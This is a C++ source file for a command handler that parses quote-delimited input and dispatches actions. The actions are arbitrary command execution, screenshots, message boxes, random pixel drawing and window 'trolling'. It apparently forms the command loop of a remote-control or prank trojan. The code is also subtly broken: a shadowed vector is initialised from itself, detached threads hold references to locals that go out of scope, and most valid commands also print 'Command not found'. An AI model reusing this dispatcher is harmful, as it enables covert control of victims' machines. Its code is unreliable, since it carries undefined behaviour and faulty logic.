#include "CommandHandler.h"

CommandHandler::CommandHandler()
{
    std::cout << "[Command Handler] [+] Created instance!\n";
}

CommandHandler::~CommandHandler()
{
    std::cout << "[Command Handler] [+] Destroyed instance!\n";
}

void CommandHandler::setInput(std::string input)
{
    rawInput = input;
}

void CommandHandler::clean()
{
    std::cout << "[Command Handler] [+] Cleaning input!\n";
    std::istringstream iss(rawInput);
    std::string token;

    while (std::getline(iss, token, '\''))
    {
        token.erase(std::remove_if(token.begin(), token.end(), ::isspace), token.end());

        if (!token.empty())
        {
            std::cout << "[Command Handler :: clean()] [~] Token: " << token << "\n";
            args.push_back(token);
        }
    }
    //std::cout << args[0] << "A" << args[1] << "\n";
}

void CommandHandler::callFunction()
{
    clean();
    std::cout << "[Command Handler] [+] Calling function!\n";

    if (args[0] == "Message")
    {
        std::vector<std::string> args = {args[1], args[2]};
        std::thread t(commands::showMessageBox, std::ref(args));
        t.detach();
    }

    if (args[0] == "Execute")
    {
        std::thread t(commands::execute, std::ref(args[1]));
        t.detach();
    }

    if (args[0] == "Cringe")
    {
        std::thread t(commands::cringe);
        t.detach();
    }

    if (args[0] == "screentest")
    {
        std::thread t(commands::Screenshot_C);
        t.detach();
    }
    
    if(args[0] == "randomPixel")
    {
        std::thread t(commands::randomPixel, std::stoi(args[1]), std::stoi(args[2]), 10);
        t.detach();
    }

    if(args[0] == "WindowTroll")
    {
        std::thread t(commands::WindowTroll);
        t.detach();
    }

    if(args[0] == "Exit")
    {
        commands::StopProcess();
    } else {
        std::cout << "[Command Handler] [!] Command not found!\n";
    }
}

void CommandHandler::DebugPrint()
{
    if(Debug)
    {
        std::cout << "[+] Called  with args -> ";
        for(int i = 0; i < static_cast<int>(args.size()); i++)
        {
            std::cout << args[i] << " ";
        }
        std::cout << "\n";
    }
}